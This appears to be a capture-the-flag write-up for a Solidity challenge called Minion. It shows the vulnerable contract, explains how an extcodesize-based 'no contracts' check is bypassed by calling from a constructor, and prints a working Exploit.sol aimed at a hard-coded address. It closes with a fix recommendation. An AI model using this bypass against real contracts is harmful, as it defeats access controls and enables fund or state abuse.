**Description**

This challenge has a function called `pwn()` that has some `require` statements that make it seem impossible to call, such as, the fact that it can't be called by an EOA or a smart contract. It seems impossible, right? Well, let's see about that.

- **Minion.sol**
```solidity=
pragma solidity ^0.8.0;
contract Minion{
    mapping(address => uint256) private contributionAmount;
    mapping(address => bool) private pwned;
    address public owner;
    uint256 private constant MINIMUM_CONTRIBUTION = (1 ether)/10;
    uint256 private constant MAXIMUM_CONTRIBUTION = (1 ether)/5;
    
    constructor(){
        owner = msg.sender;
    }

    function isContract(address account) internal view returns(bool){
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }    
    function pwn() external payable{
        require(tx.origin != msg.sender, "Well we are not allowing EOAs, sorry");
        require(!isContract(msg.sender), "Well we don't allow Contracts either");
        require(msg.value >= MINIMUM_CONTRIBUTION, "Minimum Contribution needed is 0.1 ether");
        require(msg.value <= MAXIMUM_CONTRIBUTION, "How did you get so much money? Max allowed is 0.2 ether");
        require(block.timestamp % 120 >= 0 && block.timestamp % 120 < 60, "Not the right time");
        contributionAmount[msg.sender] += msg.value;
        
        if(contributionAmount[msg.sender] >= 1 ether){
            pwned[msg.sender] = true;
            
        }
    }
    
    function verify(address account) external view returns(bool){
     require(account != address(0), "You trynna trick me?");
     return pwned[account];
    }
    
    function retrieve() external{
        require(msg.sender == owner, "Are you the owner?");
        require(address(this).balance > 0, "No balance, you greedy hooman");
        payable(owner).transfer(address(this).balance);
    }

    function timeVal() external view returns(uint256){
        return block.timestamp;
    }
}
```
**Attack Vector**

To begin, we can simply deploy a contract that calls the `pwn()` function in its constructor because it checks if the `tx.origin` and `msg.sender` are different, which means we can use a contract, but it also checks if the contract size is zero, which we can bypass by calling it from the constructor. What's left is that the `blocktimestamp % 120` should be less than 60, which has a `50%` chance of working, so the exploit contract will be the following:

**Attack Scenario**
- **Exploit.sol**
```solidity=
pragma solidity ^0.8.0;

interface IMinon{
    function pwn() external payable;
    function verify(address account) external view returns(bool);
} 
contract Exploit{
    address minion;
    constructor(){
        minion = 0x5b0754F254c55420Dc7f02270671e630707a9bC0;
        while(!IMinon(minion).verify(address(this)))
            IMinon(minion).pwn{value: 0.1 ether}();
    }
}

```

**Recommendation**

Do not rely on the contract size to decide if the caller is an `EOA`, as it can be bypassed by a call from the `constructor`.